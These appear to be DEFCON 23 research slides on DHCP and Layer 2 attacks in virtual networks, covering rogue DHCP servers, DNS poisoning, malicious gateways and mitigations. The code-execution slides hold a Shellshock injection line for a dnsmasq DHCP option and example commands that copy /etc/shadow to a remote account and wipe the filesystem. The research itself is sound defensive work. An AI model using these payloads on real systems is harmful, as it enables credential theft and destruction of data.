© 2015 Ronny L. Bull - Clarkson University
● DHCP Attacks
– Rogue DHCP server is placed on a network
– Competes with legitimate DHCP server when responding to 
client addressing requests
– 50/50 chance that a client will associate with malicious 
server since client requests are broadcast to the network
● Multiple rogue DHCP servers will reduce the odds!
– Setting up a DHCP server on an existing system is very 
simple and can be completed in a matter of minutes
DHCP Attacks
Duplicate Addressing
© 2015 Ronny L. Bull - Clarkson University
● Condition:
– Two DHCP servers provide addresses to clients on the 
same network within the same range
● ie. 10.1.2.100 – 10.1.2.200
– High probability that duplicate addressing will occur
● First address allocated from each DHCP server will most 
likely be: 10.1.2.100
● Then 10.1.2.101 … 102 … 103 ... etc ...
DHCP Attacks
Duplicate Addressing
© 2015 Ronny L. Bull - Clarkson University
● Affect:
– Denial of Service for the two clients that received the 
same address
● In conflict
● Services provided by those clients become inaccessible 
to other systems on the same network
● Client is unable to access resources on the network due 
to the conflict
DHCP Attacks
Duplicate Addressing
© 2015 Ronny L. Bull - Clarkson University
DHCP Attacks
Rogue DNS Server
© 2015 Ronny L. Bull - Clarkson University
● Condition:
– A malicious DHCP server provides associated clients with 
the IP address of a poisoned DNS server
– Poisoned DNS server is seeded with information that directs 
clients to spoofed websites or services 
● Affect:
– Client system is directed to malicious services that are 
intended to steal information or plant viruses, worms, 
maleware, or trojans on the system
– PII or other sensitive information is harvested by the attacker
DHCP Attacks
Rogue DNS Server
© 2015 Ronny L. Bull - Clarkson University
DHCP Attacks
Incorrect Default Gateway
© 2015 Ronny L. Bull - Clarkson University
● Condition:
– A malicious DCHP server provides the IP address of an 
incorrect default gateway for associated clients
● Affect:
– Clients are unable to route traffic outside of their broadcast 
domain
– Unable to access other resources on subnets or the Internet
DHCP Attacks
Malicious Honeynet
© 2015 Ronny L. Bull - Clarkson University
● Condition:
– A malicious DCHP server provides the IP address of an 
malicious default gateway for associated clients
● Affect:
– Client traffic is routed to a malicious honeynet that the 
attacker setup in order to harvest PII or other sensitive 
information 
DHCP Attacks
Malicious Honeynet
© 2015 Ronny L. Bull - Clarkson University
DHCP Attacks
Remote Execution of Code
© 2015 Ronny L. Bull - Clarkson University
● Condition:
– By making use of certain DHCP options clients can be 
forced to run code or other commands while acquiring a 
DHCP lease
● Each time the lease is renewed the code will be 
executed, not just the initial time!
– The BASH vulnerability ShellShock can be leveraged to 
remotely execute commands or run code on a vulnerable 
Linux or Mac OSX system
DHCP Attacks
Remote Execution of Code
© 2015 Ronny L. Bull - Clarkson University
● Affect:
– Remote commands or code executed on associated system 
with root privileges!
● Intent could be harmless to catastrophic:
– Set the system banner:
● echo “Welcome to $HOSTNAME” > /etc/motd
– Send the shadow file somewhere:
● scp /etc/shadow PI:EMAIL:.
– Delete all files and folders on the system recursively 
from /
● rm -rf /
DHCP Attacks
Remote Execution of Code
© 2015 Ronny L. Bull - Clarkson University
DHCP Attack Test Environment
© 2015 Ronny L. Bull - Clarkson University
● The same test environment was used as in the previous 
MAC flooding experiment
DHCP Attack Virtual Machines
© 2015 Ronny L. Bull - Clarkson University
● However four new virtual machines were created in each 
platform to setup scenarios
DHCP Attack Scenarios
© 2015 Ronny L. Bull - Clarkson University
● Remote Execute of Code
– The following command was passed with DHCP option 100:
dhcp-option-force=100,() { :; }; /bin/echo 'Testing shellshock vulnerability. If you 
can read this it worked!'>/tmp/shellshock
– The 'id' command was also passed to verify root privileges
● Poisoned DNS Server
– The DHCP server was also configured as the poisoned DNS 
server directing clients to a malicious web server spoofing 
gmail.com, mail.google.com, and www.gmail.com
DHCP Attack Scenarios
© 2015 Ronny L. Bull - Clarkson University
● Invalid Default Gateway
– Clients were passed a default gateway address of 1.1.1.1 
instead of the valid 192.168.1.1
● Malicious Default Gateway
– Clients were passed a default gateway address of 
192.168.1.20 which was a system configured as a simple 
router routing traffic to a malicious honeynet containing a 
web server
Monitoring DHCP Traffic
© 2015 Ronny L. Bull - Clarkson University
Monitoring DHCP Traffic
© 2015 Ronny L. Bull - Clarkson University
192.168.1.2 = Legitimate DHCP Server
192.168.1.3 = Rogue DHCP Server
Legit
Rogue
Legit
Rogue
Monitoring DHCP Traffic
© 2015 Ronny L. Bull - Clarkson University
Shellshock ID Command Test
© 2015 Ronny L. Bull - Clarkson University
/etc/dnsmasq.conf entry on server:
Output of dhclient on client:
DHCP Attack Summary
© 2015 Ronny L. Bull - Clarkson University
DHCP Attack Demos
© 2015 Ronny L. Bull - Clarkson University
● Poisoned DNS server
– https://www.youtube.com/watch?v=XIH51udAZt0
● Initial Shellshock test (write file to /tmp)
– https://www.youtube.com/watch?v=K3ft-tt0N3M
● Shellshock exploit (full root access)
– https://www.youtube.com/watch?v=ZdL_6XF1w3o
DHCP Attack Mitigation
© 2015 Ronny L. Bull - Clarkson University
● DHCP attacks can be mitigated by the following:
● Enforcing static IP addressing, DNS entries, and default 
gateways on every device
– Cumbersome!
– Prone to error
● Utilized DHCP snooping on switches
– Option on some physical switches (Cisco, HP)
– Restrict network access to specific MAC addresses 
connected to specific switch ports
● Highly restrictive!
● Prevents unauthorized DHCP servers
DHCP Attack Mitigation
© 2015 Ronny L. Bull - Clarkson University
● Use DHCP server authorization
– Windows 2000 server and up
– Feature of Active Directory and Windows DHCP servers
● Techniques using software defined networking (SDN) 
could be explored
– Define filters to identify DHCP client requests on the 
broadcast domain and forward them to the correct server
DHCP Attack Mitigation
© 2015 Ronny L. Bull - Clarkson University
● SELinux Enabled (Default in CentOS & RedHat)
– Seemed to have no affect on the majority of the attacks
– Shellshock DHCP attack
● When enabled it did prevent us from writing to any 
directory that did not have 777 permissions.
– Could write to /tmp & /var/tmp
– Could not write to /root, /, /etc/, /home/xxx
● When disabled we could use the attack to write files 
anywhere on the system as the root user
Looking Ahead
VLAN Hopping Attacks
© 2015 Ronny L. Bull - Clarkson University
Next Step
● Next step: evaluate VLAN security in virtualized 
environments:
● All virtual switch products support the creation of VLANs
● VLANs allow service providers to logically separate and isolate 
multi-tenant virtual networks within their environments
● Do the current known vulnerabilities in commonly used 
VLAN protocols apply to virtualized networks?
● Could allow for:
● Eavesdropping of traffic on restricted VLANs
● Injection of packets onto a restricted VLAN
● DoS attacks
● Covert channels
© 2015 Ronny L. Bull - Clarkson University
Conclusion
● All Layer 2 vulnerabilities discussed were targeted towards 
the virtual networking devices not the hypervisors 
themselves
● Results show that virtual networking devices CAN be just 
as vulnerable as their physical counterparts
● Further research and experimentation is necessary to find 
out more similarities
● XenServer and any other solutions utilizing Open vSwitch 
are vulnerable to eavesdropping out of the box!
● All environments are vulnerable to manipulation via the 
DHCP protocol out of the box!
© 2015 Ronny L. Bull - Clarkson University
Conclusion
© 2015 Ronny L. Bull - Clarkson University
● A single malicious virtual machine has the potential to sniff 
all traffic passing over a virtual switch
– This can pass through the virtual switch and affect physically 
connected devices allowing traffic from other parts of the 
network to be sniffed as well!
● Significant threat to the confidentiality, integrity, and 
availability (CIA) of data passing over a network in a 
virtualized muli-tenant environment
● The results of the research presented today provide proof 
that a full assessment of Layer 2 network security in multi-
tenant virtualized network environments is warranted
Take-Away Actions
© 2015 Ronny L. Bull - Clarkson University
● Users become empowered by understanding which virtual 
switch implementations are vulnerable to different Layer 2 
network attacks
– Educated users will question providers about their hosting 
environment
– Audit the risk of workloads they run in the cloud or within 
multi-tenant virtualized environments
– Consider extra security measures
● Increased use of encryption
● Service monitoring
● Threat detection and Alerting
© 2015 Ronny L. Bull - Clarkson University
● Email:
– PI:EMAIL
– PI:EMAIL
● The white paper and narrated video demos are available 
on the DEFCON 23 CD
● Special thanks to Nick Merante for helping to acquire the 
equipment needed to perform this research